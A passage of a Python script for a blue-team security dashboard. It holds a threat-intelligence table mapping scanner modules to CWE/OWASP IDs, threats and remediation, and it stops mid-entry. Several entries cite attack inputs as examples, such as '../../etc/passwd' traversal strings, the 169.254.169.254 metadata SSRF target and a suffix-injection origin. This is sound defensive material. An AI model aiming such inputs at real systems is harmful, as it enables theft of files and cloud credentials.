#!/usr/bin/env python3
"""
Tblue Blue Team Dashboard Generator.

Usage:
    python generate_dashboard.py              # auto-runs tests + generates report
    python generate_dashboard.py --skip-run  # uses existing /tmp JSON files
"""

import json
import os
import subprocess
import sys
import argparse
from datetime import datetime
from pathlib import Path

REPORT_JSON   = "/tmp/tblue_test_results.json"
COVERAGE_JSON = "/tmp/tblue_coverage.json"
OUTPUT_HTML   = "tblue_dashboard.html"

# ── Threat intelligence database ──────────────────────────────────────────────
# Maps scanner module name → severity, threat description, and remediation steps.
# Shown in the dashboard when tests for that module fail.
THREAT_INTEL = {
    "cloud_storage": {
        "severity": "CRITICAL",
        "short": "Public Cloud Storage Bucket",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "threats": [
            "All files in public S3/Azure/GCS buckets are readable by anyone on the internet",
            "Exposed backups, PII, credentials, and source code can be exfiltrated silently",
            "Regulatory violation (GDPR, HIPAA, PCI-DSS) — data breach notification may be required",
            "Attackers can enumerate every object in the bucket via the listing API",
        ],
        "remediation": [
            "Enable S3 Block Public Access at the AWS account level (prevents all future misconfigs)",
            "Audit all bucket ACLs and policies — remove public-read / public-read-write grants",
            "Enable AWS Config rule s3-bucket-public-read-prohibited with SNS alerting",
            "Rotate any credentials that may have been stored in the exposed bucket",
            "Use AWS Macie to classify and detect sensitive data stored in S3",
        ],
    },
    "cloud_metadata": {
        "severity": "CRITICAL",
        "short": "Cloud Instance Metadata SSRF",
        "cwe": "CWE-918", "owasp": "A10:2021",
        "threats": [
            "SSRF to 169.254.169.254 returns temporary cloud credentials (IAM role tokens)",
            "Stolen credentials allow full pivot across the cloud environment (EC2, S3, RDS, Lambda)",
            "AWS IMDSv1 is unauthenticated — any SSRF reaches it without token negotiation",
            "Metadata API also exposes SSH keys, startup scripts, and environment variables",
        ],
        "remediation": [
            "Enforce IMDSv2 (token-required mode) on all EC2 instances",
            "Block the 169.254.169.254 range at the VPC security group level for web-facing services",
            "Validate and allowlist all user-supplied URLs before making server-side HTTP requests",
            "Use Smokescreen or a dedicated egress proxy with metadata IP blocked",
        ],
    },
    "ssrf_detection": {
        "severity": "CRITICAL",
        "short": "Server-Side Request Forgery (SSRF)",
        "cwe": "CWE-918", "owasp": "A10:2021",
        "threats": [
            "SSRF allows attackers to reach internal services that are not internet-accessible",
            "Internal network scanning via SSRF reveals topology and exposes admin interfaces",
            "Access to cloud metadata endpoints yields IAM credentials and environment secrets",
            "Can bypass IP allowlists via DNS rebinding or open redirect chains",
        ],
        "remediation": [
            "Validate URLs against an allowlist of permitted destinations before fetching",
            "Block RFC-1918 and link-local ranges (10.x, 172.16.x, 192.168.x, 169.254.x) at egress",
            "Use a dedicated HTTP proxy (Smokescreen) for all outbound requests",
            "Resolve DNS after allowlist check and re-validate the resolved IP",
        ],
    },
    "ssrf_advanced": {
        "severity": "CRITICAL",
        "short": "Advanced SSRF Bypass",
        "cwe": "CWE-918", "owasp": "A10:2021",
        "threats": [
            "DNS rebinding bypasses IP-based SSRF filters by returning internal IPs post-validation",
            "IPv6 / octal / hex encoding of 169.254.169.254 evades naive blocklists",
            "HTTP redirect chains allow SSRF filters to be bypassed in a single hop",
        ],
        "remediation": [
            "Re-validate the resolved IP on every redirect — TOCTOU-safe check required",
            "Normalize and canonicalize all URLs before validation; reject non-standard encodings",
            "Use a purpose-built SSRF prevention proxy (Smokescreen by Stripe)",
        ],
    },
    "command_injection": {
        "severity": "CRITICAL",
        "short": "OS Command Injection",
        "cwe": "CWE-78", "owasp": "A03:2021",
        "threats": [
            "Unsanitized input passed to shell gives attackers remote code execution (RCE)",
            "Metacharacters (; | && $() backticks) allow arbitrary command chaining",
            "Full server compromise: read /etc/shadow, install backdoors, pivot internally",
        ],
        "remediation": [
            "Never pass user input to shell=True subprocess calls or os.system()",
            "Use parameterized subprocess with a fixed argv list — no shell interpolation",
            "Run application processes as a least-privilege non-shell user",
        ],
    },
    "deserialization": {
        "severity": "CRITICAL",
        "short": "Insecure Deserialization",
        "cwe": "CWE-502", "owasp": "A08:2021",
        "threats": [
            "Malicious serialized payloads trigger RCE via gadget chains during deserialization",
            "Java, PHP, Python pickle, and .NET binary formatters are all susceptible",
            "DoS via Billion Laughs / recursive objects; auth bypass via tampered session blobs",
        ],
        "remediation": [
            "Never deserialize data from untrusted sources",
            "Use safe formats (JSON with strict schema validation) instead of native serialization",
            "Implement HMAC signing on serialized session data",
            "For Java: deploy RASP / agent-based deserialization attack detection",
        ],
    },
    "ssti": {
        "severity": "CRITICAL",
        "short": "Server-Side Template Injection (SSTI)",
        "cwe": "CWE-94", "owasp": "A03:2021",
        "threats": [
            "SSTI in Jinja2, Twig, Freemarker gives RCE with server-level code execution",
            "Template sandbox escapes allow filesystem access and subprocess spawning",
            "Credentials and env vars accessible via template engine introspection",
        ],
        "remediation": [
            "Never render user input as template code — only pass it as template variables",
            "Use SandboxedEnvironment (Jinja2) as defense-in-depth",
            "Audit all template rendering calls for dynamic template string construction",
        ],
    },
    "k8s_exposure": {
        "severity": "CRITICAL",
        "short": "Kubernetes API / Dashboard Exposure",
        "cwe": "CWE-284", "owasp": "A01:2021",
        "threats": [
            "Exposed kube-apiserver allows cluster-admin takeover without authentication",
            "Kubernetes Dashboard without auth bypasses all RBAC controls",
            "Attacker can deploy malicious containers and steal all cluster Secrets",
        ],
        "remediation": [
            "Enable Kubernetes RBAC and disable anonymous API server access",
            "Put the API server behind a VPN — never expose port 6443 publicly",
            "Require authentication for Kubernetes Dashboard; apply NetworkPolicies",
        ],
    },
    "spring_actuator": {
        "severity": "CRITICAL",
        "short": "Spring Boot Actuator Exposed",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "threats": [
            "/actuator/env exposes all env vars including database passwords and API keys",
            "/actuator/heapdump gives a full JVM heap dump containing decrypted secrets",
            "Jolokia JMX bridge allows arbitrary MBean invocation → RCE",
        ],
        "remediation": [
            "Set management.endpoints.web.exposure.include=health,info in application.properties",
            "Require authentication for all actuator endpoints beyond /health and /info",
            "Disable sensitive endpoints: shutdown, env, heapdump, loggers, mappings",
        ],
    },
    "cors": {
        "severity": "HIGH",
        "short": "CORS Misconfiguration",
        "cwe": "CWE-942", "owasp": "A01:2021",
        "threats": [
            "Reflected origin + Allow-Credentials: true enables cross-site credential theft",
            "Attacker site makes authenticated API calls on behalf of logged-in victims",
            "Wildcard ACAO (*) disables same-origin protection for all cross-origin requests",
            "Null-origin acceptance allows sandboxed iframes / local HTML to access APIs",
        ],
        "remediation": [
            "Maintain a server-side allowlist of trusted origins — never reflect the request Origin dynamically",
            "Never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true",
            "Use SameSite=Strict on session cookies as complementary defense",
        ],
    },
    "cors_advanced": {
        "severity": "HIGH",
        "short": "Advanced CORS Bypass",
        "cwe": "CWE-942", "owasp": "A01:2021",
        "threats": [
            "Regex-based origin validation bypassed via suffix injection (evil.com.attacker.com)",
            "Subdomain wildcard reflection: any attacker-controlled subdomain bypasses the check",
        ],
        "remediation": [
            "Use exact string matching for origins — avoid regex patterns with wildcards",
            "Audit subdomain ownership — any compromised subdomain becomes a CORS bypass vector",
        ],
    },
    "graphql": {
        "severity": "HIGH",
        "short": "GraphQL Information Disclosure",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Introspection enabled in production exposes the full API schema to attackers",
            "Field suggestions reveal private types and fields even with introspection disabled",
            "Schema enumeration targets specific data types and mutations for further attacks",
        ],
        "remediation": [
            "Disable introspection in production; use persisted/whitelisted queries",
            "Disable field suggestions or return a generic 'unknown field' error message",
            "Implement query depth and complexity limits",
        ],
    },
    "graphql_advanced": {
        "severity": "HIGH",
        "short": "GraphQL Advanced Attacks",
        "cwe": "CWE-400", "owasp": "A04:2021",
        "threats": [
            "GraphQL IDE (GraphiQL/Playground) in production gives a full query interface to attackers",
            "Batching attacks bypass rate limiting by combining many operations in one request",
        ],
        "remediation": [
            "Disable GraphQL IDE in production — restrict to localhost or VPN",
            "Implement per-request operation count limits and query batch size limits",
        ],
    },
    "graphql_depth": {
        "severity": "HIGH",
        "short": "GraphQL Depth / DoS",
        "cwe": "CWE-400", "owasp": "A04:2021",
        "threats": [
            "Deeply nested queries consume exponential CPU/memory causing Denial of Service",
            "Alias flooding multiplies resolver execution bypassing simple query count limits",
        ],
        "remediation": [
            "Enforce maximum query depth (recommended: 5–7 levels)",
            "Enforce maximum query complexity score before execution",
            "Rate-limit GraphQL requests per IP / per token",
        ],
    },
    "jwt_security": {
        "severity": "HIGH",
        "short": "JWT Vulnerability",
        "cwe": "CWE-347", "owasp": "A02:2021",
        "threats": [
            "alg:none attack allows forging tokens without a valid signature",
            "Algorithm confusion (RS256→HS256) uses the public key as HMAC secret — full auth bypass",
            "Weak HMAC secrets brute-forced offline to forge arbitrary tokens",
            "Missing exp claim allows tokens to remain valid indefinitely after compromise",
        ],
        "remediation": [
            "Explicitly allowlist accepted JWT algorithms — reject 'none' and unexpected algorithms",
            "Use ≥256-bit entropy for HMAC secrets; use asymmetric keys for RS256",
            "Verify exp and iat claims on every request; use short-lived tokens (≤15 min)",
        ],
    },
    "jwt_advanced": {
        "severity": "HIGH",
        "short": "Advanced JWT Attacks",
        "cwe": "CWE-347", "owasp": "A02:2021",
        "threats": [
            "JKU/X5U header injection redirects key verification to an attacker-controlled URL",
            "Embedded JWK attack injects a crafted public key that the server then trusts",
            "KID injection can be used for path traversal or SQL injection",
        ],
        "remediation": [
            "Ignore jku/x5u/jwk headers in JWT — only use pre-configured trusted keys",
            "Treat KID as an opaque identifier, never as a filename or SQL fragment",
        ],
    },
    "open_redirect": {
        "severity": "HIGH",
        "short": "Open Redirect",
        "cwe": "CWE-601", "owasp": "A01:2021",
        "threats": [
            "Phishing attacks using your trusted domain as a redirect gateway",
            "OAuth token theft when redirect_uri points to an open redirect on the resource server",
            "SSRF chain: open redirect to internal metadata endpoint",
        ],
        "remediation": [
            "Validate redirect URLs against a server-side allowlist of permitted destinations",
            "For OAuth: perform exact string matching on redirect_uri — no prefix matching",
            "Show a warning interstitial for any external redirect",
        ],
    },
    "admin_exposure": {
        "severity": "HIGH",
        "short": "Exposed Admin Interface",
        "cwe": "CWE-284", "owasp": "A01:2021",
        "threats": [
            "Public admin panels targeted by credential stuffing and password spraying",
            "Default or weak admin credentials give full application control to attackers",
            "Admin panels typically bypass normal authorization checks",
        ],
        "remediation": [
            "Restrict admin interfaces to VPN/internal IP ranges at the network layer",
            "Require MFA for all admin access",
            "Use separate authentication domains for admin vs. regular user access",
        ],
    },
    "access_control": {
        "severity": "HIGH",
        "short": "Broken Access Control",
        "cwe": "CWE-284", "owasp": "A01:2021",
        "threats": [
            "IDOR allows accessing other users' records by manipulating object identifiers",
            "Privilege escalation by accessing admin endpoints without authorization",
            "Mass assignment overwrites security-critical fields (is_admin, role, balance)",
        ],
        "remediation": [
            "Enforce authorization server-side on every request — never trust client-side controls",
            "Use UUIDs instead of sequential integer IDs for resource identifiers",
            "Implement allowlisting for mass assignment — explicitly list safe fields",
        ],
    },
    "path_traversal": {
        "severity": "HIGH",
        "short": "Path Traversal",
        "cwe": "CWE-22", "owasp": "A01:2021",
        "threats": [
            "../../etc/passwd, /proc/self/environ read server OS files and environment secrets",
            "Source code disclosure if web root paths are traversable",
            "Credential files (/etc/shadow, .env, .aws/credentials) exposed",
        ],
        "remediation": [
            "Canonicalize paths with realpath() and verify they fall within an allowed base directory",
            "Never pass user input directly to filesystem APIs",
            "Chroot or containerize the service to limit filesystem scope",
        ],
    },
    "xxe_injection": {
        "severity": "HIGH",
        "short": "XML External Entity (XXE) Injection",
        "cwe": "CWE-611", "owasp": "A05:2021",
        "threats": [
            "XXE reads arbitrary server-side files via DOCTYPE/ENTITY declarations",
            "Blind XXE exfiltrates file contents via out-of-band DNS/HTTP callbacks",
            "SSRF via XXE probes internal network services",
        ],
        "remediation": [
            "Disable external entity processing in your XML parser (DTD off)",
            "For Java: set XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES to false",
            "Use JSON instead of XML where possible — eliminate the attack surface",
        ],
    },
    "dependency_confusion": {
        "severity": "HIGH",
        "short": "Dependency Confusion Attack",
        "cwe": "CWE-427", "owasp": "A06:2021",
        "threats": [
            "Internal package names in manifests can be squatted on public npm/PyPI/RubyGems",
            "Attacker publishes a malicious package with the same name at a higher version",
            "Package manager prefers public registry — malicious code executes during install",
        ],
        "remediation": [
            "Use private registry scoping (@company/ prefix for npm, company-owned PyPI index)",
            "Pin all versions with lock files (package-lock.json, poetry.lock) verified in CI",
            "Register / reserve all internal package names on public registries proactively",
        ],
    },
    "cicd_exposure": {
        "severity": "HIGH",
        "short": "CI/CD Secret & Config Exposure",
        "cwe": "CWE-312", "owasp": "A02:2021",
        "threats": [
            "CI config files may expose secret names, pipeline logic, and deployment targets",
            "Hardcoded credentials in CI configs give persistent access to infrastructure",
            "Build logs in accessible locations leak environment variables with secrets",
        ],
        "remediation": [
            "Store secrets exclusively in CI/CD secret managers (GitHub Secrets, Vault, AWS SSM)",
            "Never hardcode credentials in workflow files or Dockerfiles",
            "Restrict CI log visibility to authorized team members",
        ],
    },
    "subdomain_takeover": {
        "severity": "HIGH",
        "short": "Subdomain Takeover",
        "cwe": "CWE-350", "owasp": "A05:2021",
        "threats": [
            "Dangling DNS CNAME pointing to an unclaimed cloud service can be registered by an attacker",
            "Attacker hosts content on your subdomain — enables phishing and session cookie theft",
            "Cookies scoped to parent domain accessible from the compromised subdomain",
        ],
        "remediation": [
            "Remove DNS records immediately when decommissioning services",
            "Audit all CNAME records against active services and alert on orphaned CNAMEs",
            "Use __Host- prefix on sensitive cookies to prevent subdomain cookie leakage",
        ],
    },
    "session_security": {
        "severity": "HIGH",
        "short": "Session Management Weakness",
        "cwe": "CWE-384", "owasp": "A07:2021",
        "threats": [
            "Session fixation allows pre-setting a victim's token before authentication",
            "Predictable session IDs brute-forced to hijack active sessions",
            "Sessions not invalidated on logout allow reuse of stolen tokens indefinitely",
        ],
        "remediation": [
            "Regenerate session ID on every privilege escalation (login, role change)",
            "Use cryptographically random tokens with ≥128 bits of entropy",
            "Invalidate sessions server-side on logout; enforce idle + absolute timeouts",
        ],
    },
    "tls_deep": {
        "severity": "HIGH",
        "short": "TLS / SSL Misconfiguration",
        "cwe": "CWE-326", "owasp": "A02:2021",
        "threats": [
            "TLS 1.0/1.1 have known vulnerabilities (POODLE, BEAST) — deprecated by RFC 8996",
            "Weak cipher suites (RC4, DES, NULL) allow decryption of captured traffic",
            "Missing certificate validation enables man-in-the-middle attacks",
        ],
        "remediation": [
            "Enforce TLS 1.2 minimum; TLS 1.3 preferred",
            "Disable all weak cipher suites — use Mozilla SSL Configuration Generator",
            "Enable HSTS with a long max-age and preload",
        ],
    },
    "headers": {
        "severity": "MEDIUM",
        "short": "Missing Security Headers",
        "cwe": "CWE-693", "owasp": "A05:2021",
        "threats": [
            "Missing Strict-Transport-Security allows SSL stripping on unencrypted networks",
            "Missing X-Frame-Options enables clickjacking attacks on login / action pages",
            "Missing X-Content-Type-Options allows MIME-sniffing-based content injection",
        ],
        "remediation": [
            "Set Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
            "Set X-Frame-Options: DENY or use CSP frame-ancestors 'none'",
            "Set X-Content-Type-Options: nosniff on all responses",
            "Audit at securityheaders.com after each deployment",
        ],
    },
    "csp": {
        "severity": "MEDIUM",
        "short": "Missing Content-Security-Policy",
        "cwe": "CWE-693", "owasp": "A05:2021",
        "threats": [
            "Without CSP, any XSS can execute arbitrary JavaScript in the victim's browser",
            "No monitoring of injection attempts without report-uri",
        ],
        "remediation": [
            "Start with Content-Security-Policy-Report-Only to capture violations without breaking the site",
            "Progress to enforcing mode: default-src 'self'; replace unsafe-inline with nonces",
        ],
    },
    "csp_advanced": {
        "severity": "MEDIUM",
        "short": "Weak Content-Security-Policy",
        "cwe": "CWE-693", "owasp": "A05:2021",
        "threats": [
            "unsafe-inline and unsafe-eval completely negate XSS protection",
            "CDN wildcards (*.googleapis.com) become XSS bypass vectors if any CDN file is compromised",
        ],
        "remediation": [
            "Replace unsafe-inline with nonce-based CSP (nonce changes per request)",
            "Remove unsafe-eval — refactor code that uses eval()/setTimeout(string)",
            "Use specific CDN URLs rather than wildcards in script-src",
        ],
    },
    "cookies": {
        "severity": "MEDIUM",
        "short": "Insecure Cookie Configuration",
        "cwe": "CWE-614", "owasp": "A02:2021",
        "threats": [
            "Missing Secure flag transmits session cookies over HTTP — interceptable on the network",
            "Missing HttpOnly flag exposes session tokens to JavaScript (XSS persistence)",
            "Missing SameSite flag enables CSRF attacks against session-authenticated endpoints",
        ],
        "remediation": [
            "Set Secure, HttpOnly, and SameSite=Lax (or Strict) on all session cookies",
            "Use short cookie expiry for session cookies — no persistent sessions",
        ],
    },
    "cookie_advanced": {
        "severity": "MEDIUM",
        "short": "Advanced Cookie Security Issues",
        "cwe": "CWE-614", "owasp": "A02:2021",
        "threats": [
            "Overly broad cookie Domain attribute leaks cookies to all subdomains",
            "Cookie prefix violations (__Host- / __Secure-) allow subdomain cookie injection",
        ],
        "remediation": [
            "Use __Host- prefix for most sensitive cookies: restricts to exact host, HTTPS-only, path=/",
            "Omit Domain attribute where possible — defaults to current host only",
        ],
    },
    "sri_advanced": {
        "severity": "MEDIUM",
        "short": "Missing Subresource Integrity (SRI)",
        "cwe": "CWE-345", "owasp": "A08:2021",
        "threats": [
            "CDN scripts without SRI can be replaced with malicious code via CDN compromise or BGP hijack",
            "No integrity check means any CDN-level modification executes in all users' browsers",
        ],
        "remediation": [
            "Add integrity='sha384-...' and crossorigin='anonymous' to every external script/link tag",
            "Generate SRI hashes at build time (webpack-subresource-integrity plugin)",
            "Consider self-hosting critical third-party libraries",
        ],
    },
    "clickjacking": {
        "severity": "MEDIUM",
        "short": "Clickjacking Vulnerability",
        "cwe": "CWE-1021", "owasp": "A05:2021",
        "threats": [
            "Attackers embed your site in an invisible iframe and trick users into clicking hidden UI elements",
            "One-click attacks on authenticated actions: password change, wire transfers, account deletion",
        ],
        "remediation": [
            "Set X-Frame-Options: DENY on all pages (or SAMEORIGIN if self-framing is required)",
            "Add CSP frame-ancestors 'none' — more flexible than X-Frame-Options",
        ],
    },
    "fetch_metadata": {
        "severity": "MEDIUM",
        "short": "Missing Fetch Metadata Isolation",
        "cwe": "CWE-346", "owasp": "A01:2021",
        "threats": [
            "Without Sec-Fetch-Site checking, cross-site requests can trigger state-changing actions",
            "CSRF becomes trivial when server cannot distinguish same-site vs. cross-site requests",
        ],
        "remediation": [
            "Implement a Resource Isolation Policy that rejects unexpected Sec-Fetch-Site values",
            "Pair with SameSite=Strict cookies and CSRF tokens as layered defense",
        ],
    },
    "dns_security": {
        "severity": "MEDIUM",
        "short": "Email / DNS Security Misconfiguration",
        "cwe": "CWE-350", "owasp": "A05:2021",
        "threats": [
            "Missing SPF/DKIM/DMARC allows domain spoofing and targeted phishing via your brand",
            "p=none DMARC provides reporting only — no enforcement against spoofed email",
        ],
        "remediation": [
            "Publish a strict SPF record: v=spf1 include:... -all",
            "Enable DKIM signing on all outbound mail servers",
            "Set DMARC to p=quarantine then p=reject after monitoring ruf/rua reports",
        ],
    },
    "dns_advanced": {
        "severity": "MEDIUM",
        "short": "DNS Advanced Security Issues",
        "cwe": "CWE-350", "owasp": "A05:2021",
        "threats": [
            "Missing DNSSEC allows DNS cache poisoning and BGP hijack attacks",
            "Single nameserver provider is a single point of failure for DDoS",
            "Permissive CAA records allow any CA to issue certificates for your domain",
        ],
        "remediation": [
            "Enable DNSSEC — publish DS records at your registrar",
            "Use two independent DNS providers (split-authority NS diversity)",
            "Publish CAA records: 0 issue 'letsencrypt.org'",
        ],
    },
    "info_disclosure": {
        "severity": "MEDIUM",
        "short": "Information Disclosure",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Server version headers enable targeted exploit selection (CVE lookup by version)",
            "Debug endpoints left in production expose internal state and configuration",
        ],
        "remediation": [
            "Remove Server and X-Powered-By headers (nginx: server_tokens off; Apache: ServerTokens Prod)",
            "Disable all debug/dev endpoints in production builds",
        ],
    },
    "error_pages": {
        "severity": "MEDIUM",
        "short": "Verbose Error Pages",
        "cwe": "CWE-209", "owasp": "A05:2021",
        "threats": [
            "Stack traces expose internal file paths, class names, and framework versions",
            "SQL errors reveal database type, schema structure, and query fragments",
        ],
        "remediation": [
            "Use generic error pages in production — log full errors server-side, return only error IDs",
            "Set framework debug mode to false (Django DEBUG=False, Flask debug=False)",
        ],
    },
    "form_security": {
        "severity": "MEDIUM",
        "short": "Form Security Issues",
        "cwe": "CWE-352", "owasp": "A01:2021",
        "threats": [
            "Forms without CSRF tokens vulnerable to Cross-Site Request Forgery",
            "Autocomplete on password fields can harvest credentials from shared devices",
        ],
        "remediation": [
            "Add CSRF tokens to all state-changing form submissions",
            "Set autocomplete='off' on sensitive fields (passwords, credit cards)",
            "Ensure all form actions use HTTPS",
        ],
    },
    "api_versioning": {
        "severity": "MEDIUM",
        "short": "Deprecated API Versions Active",
        "cwe": "CWE-1104", "owasp": "A06:2021",
        "threats": [
            "Old API versions with known security vulnerabilities remain accessible",
            "Security fixes on v3 may not be backported to v1/v2",
            "Deprecated endpoints may have weaker or absent authentication requirements",
        ],
        "remediation": [
            "Return 410 Gone on all decommissioned API version paths",
            "Ensure all security controls on current versions apply equally to all active versions",
        ],
    },
    "dev_artifact": {
        "severity": "HIGH",
        "short": "Exposed Development Artifacts",
        "cwe": "CWE-538", "owasp": "A05:2021",
        "threats": [
            ".git directory exposure allows cloning the full source code repository",
            ".env files expose all application secrets and database credentials",
            "Backup files (.bak, ~) contain source code potentially including hardcoded credentials",
        ],
        "remediation": [
            "Block .git, .env, *.bak, *.swp via web server configuration (deny from all)",
            "Use .dockerignore and .gitignore to exclude sensitive files from deployments",
            "Audit pipeline to ensure only production artifacts are deployed to web root",
        ],
    },
    "directory_listing": {
        "severity": "MEDIUM",
        "short": "Directory Listing Enabled",
        "cwe": "CWE-548", "owasp": "A05:2021",
        "threats": [
            "Reveals all files and directories in the web root — backup, config, and log files",
            "Enables targeted attacks against specific files discovered in the listing",
        ],
        "remediation": [
            "Disable directory listing: nginx autoindex off; Apache Options -Indexes",
            "Serve only files that explicitly need to be web-accessible",
        ],
    },
    "rate_limit": {
        "severity": "MEDIUM",
        "short": "Missing Rate Limiting",
        "cwe": "CWE-770", "owasp": "A04:2021",
        "threats": [
            "Auth endpoints without rate limiting vulnerable to credential stuffing",
            "API endpoints without rate limiting susceptible to DoS via resource exhaustion",
        ],
        "remediation": [
            "Implement rate limiting on all authentication endpoints with exponential backoff",
            "Use Redis-backed distributed rate limiting for horizontally scaled services",
            "Add CAPTCHA after threshold of failed attempts",
        ],
    },
    "html_comments": {
        "severity": "LOW",
        "short": "Sensitive HTML Comments",
        "cwe": "CWE-615", "owasp": "A01:2021",
        "threats": [
            "Developer comments expose internal paths, credentials, and TODO security notes",
            "Version strings in comments enable targeted exploit research",
        ],
        "remediation": [
            "Strip all HTML comments in the production build pipeline (minification)",
            "Audit codebase for TODO/FIXME comments that reference security issues",
        ],
    },
    "web_cache_deception": {
        "severity": "HIGH",
        "short": "Web Cache Deception",
        "cwe": "CWE-525", "owasp": "A05:2021",
        "threats": [
            "Authenticated account pages cached by CDN and served to other users",
            "Path confusion (/account/profile.css) tricks CDN into caching private pages",
        ],
        "remediation": [
            "Set Cache-Control: no-store, private on all authenticated pages",
            "Configure CDN to respect Cache-Control headers and never cache private content",
        ],
    },
    "mixed_content": {
        "severity": "MEDIUM",
        "short": "Mixed Content (HTTP on HTTPS Page)",
        "cwe": "CWE-311", "owasp": "A02:2021",
        "threats": [
            "HTTP resources on HTTPS pages interceptable and modifiable by network attackers",
            "JavaScript loaded over HTTP replaced with malicious code silently",
        ],
        "remediation": [
            "Ensure all sub-resources (scripts, styles, images, fonts) use HTTPS",
            "Set Content-Security-Policy: upgrade-insecure-requests as a blanket fix",
        ],
    },
    # ── Phase 100 ─────────────────────────────────────────────────────────────
    "xml_security_passive": {
        "severity": "HIGH",
        "short": "XML External Entity / DTD Exposure",
        "cwe": "CWE-611", "owasp": "A03:2021",
        "threats": [
            "XXE via DOCTYPE/ENTITY declarations allows server-side file read (e.g., /etc/passwd)",
            "SSRF via external entity URIs reaches internal services and cloud metadata endpoints",
            "Billion Laughs DoS attack via exponentially expanding entity references",
            "Exposed WSDL/SOAP endpoints reveal internal service structure and method signatures",
        ],
        "remediation": [
            "Disable external entity processing: libxml2 LIBXML_NOENT off, FEATURE_EXTERNAL_GENERAL_ENTITIES false",
            "Use a deny-by-default XML parser configuration — whitelist only required features",
            "Validate and sanitize XML input before parsing; reject DOCTYPE declarations",
            "Restrict access to WSDL/SOAP endpoints via authentication or IP allowlist",
        ],
    },
    "email_config_exposure": {
        "severity": "HIGH",
        "short": "Email / SMTP Credential Exposure",
        "cwe": "CWE-312", "owasp": "A02:2021",
        "threats": [
            "SMTP credentials in JavaScript allow account takeover of the email service",
            "Exposed MailHog / mail catcher UI gives access to all internal email traffic",
            "x-mailer headers leak MTA vendor and version enabling targeted exploit research",
        ],
        "remediation": [
            "Never embed SMTP credentials in client-side JavaScript — use server-side email sending",
            "Remove or firewall MailHog and all mail debugging UIs in production",
            "Strip x-mailer, x-originating-ip, and x-php-originating-script response headers",
        ],
    },
    "graphql_info_disclosure": {
        "severity": "HIGH",
        "short": "GraphQL Information Disclosure",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Field suggestions in error messages enumerate private types and fields",
            "Stack traces in GraphQL errors reveal file paths and internal framework versions",
            "__typename access without authentication confirms GraphQL endpoint presence",
        ],
        "remediation": [
            "Disable GraphQL field suggestions in production; return generic 'unknown field' errors",
            "Suppress stack traces in error responses; log server-side only",
            "Require authentication before allowing any GraphQL query execution",
        ],
    },
    "path_normalization_security": {
        "severity": "HIGH",
        "short": "Path Normalization Bypass",
        "cwe": "CWE-22", "owasp": "A01:2021",
        "threats": [
            "URL-encoded dot sequences (%2e%2e%2f) bypass path validation and access restricted files",
            "Double-slash sequences confuse reverse proxies, allowing admin endpoint bypass",
            "Unicode normalization attacks (fullwidth characters) bypass WAF rules",
        ],
        "remediation": [
            "Normalize and canonicalize all URL paths before access control checks",
            "Reject requests with encoded dot sequences (%2e, %2f) in path segments",
            "Ensure reverse proxy and application agree on path normalization rules",
        ],
    },
    # ── Phase 101 ─────────────────────────────────────────────────────────────
    "tls_certificate_deep": {
        "severity": "HIGH",
        "short": "TLS Certificate Weakness",
        "cwe": "CWE-326", "owasp": "A02:2021",
        "threats": [
            "Expired TLS certificate eliminates all trust guarantees — browsers show hard block",
            "Weak cipher suites (RC4, DES, 3DES, EXPORT) allow decryption of captured traffic",
            "Self-signed certificate susceptible to MitM — no CA validation chain",
            "Certificate expiring in <30 days creates operational risk if renewal is missed",
        ],
        "remediation": [
            "Automate certificate renewal with Certbot / Let's Encrypt or ACM",
            "Enforce TLS 1.2+ and disable RC4, DES, 3DES, EXPORT, NULL cipher suites",
            "Use a CA-signed certificate and ensure full chain (intermediate certs) is served",
            "Monitor certificate expiry with alerting at 30-day and 7-day thresholds",
        ],
    },
    "server_timing_disclosure": {
        "severity": "MEDIUM",
        "short": "Server-Timing Internal Component Disclosure",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "threats": [
            "Server-Timing header names expose internal component stack (db, redis, auth service)",
            "Timing data reveals which backend services handle each request — aids lateral movement planning",
            "Slow operation timings (>1s) fingerprint performance characteristics for DoS targeting",
        ],
        "remediation": [
            "Strip Server-Timing headers at the reverse proxy/CDN layer in production",
            "Use generic metric names (e.g., 'total') rather than component names in timing data",
            "Gate Server-Timing output behind an internal-only access check",
        ],
    },
    "iframe_security_deep": {
        "severity": "HIGH",
        "short": "Iframe Sandbox Bypass Risk",
        "cwe": "CWE-1021", "owasp": "A05:2021",
        "threats": [
            "sandbox='allow-scripts allow-same-origin' combination defeats iframe sandbox entirely",
            "Framed sensitive pages without X-Frame-Options allow clickjacking attacks",
            "Deprecated ALLOW-FROM directive not respected by modern browsers — false sense of security",
        ],
        "remediation": [
            "Never combine allow-scripts and allow-same-origin in iframe sandbox attribute",
            "Set Content-Security-Policy: frame-ancestors 'self' for all sensitive pages",
            "Replace X-Frame-Options: ALLOW-FROM with CSP frame-ancestors directive",
        ],
    },
    # ── Phase 102 ─────────────────────────────────────────────────────────────
    "http_method_override": {
        "severity": "HIGH",
        "short": "HTTP Method Override / Tunneling",
        "cwe": "CWE-749", "owasp": "A01:2021",
        "threats": [
            "X-HTTP-Method-Override header tunnels DELETE/PUT through POST — bypasses firewall rules",
            "Form method tunneling with _method parameter bypasses WAF method restrictions",
            "Reflected override headers in responses confirm server-side method processing",
        ],
        "remediation": [
            "Disable X-HTTP-Method-Override, X-Method-Override, and X-HTTP-Method header processing",
            "Implement method validation independently of override headers",
            "Configure WAF rules to detect and block method override patterns",
        ],
    },
    "content_type_confusion": {
        "severity": "HIGH",
        "short": "Content-Type Confusion / MIME Sniffing",
        "cwe": "CWE-434", "owasp": "A05:2021",
        "threats": [
            "Missing X-Content-Type-Options allows browsers to sniff MIME type and execute malicious content",
            "JSON API responses served as text/html enable stored XSS via browser rendering",
            "SVG served without nosniff or CSP restriction allows embedded JavaScript execution",
        ],
        "remediation": [
            "Set X-Content-Type-Options: nosniff on all responses",
            "Serve JSON APIs with Content-Type: application/json — never text/html",
            "Restrict SVG serving: require authentication or serve with CSP sandbox header",
        ],
    },
    "cache_poisoning_passive": {
        "severity": "HIGH",
        "short": "Cache Poisoning Risk",
        "cwe": "CWE-524", "owasp": "A05:2021",
        "threats": [
            "Host header reflected in cached responses allows poisoning CDN cache with malicious URLs",
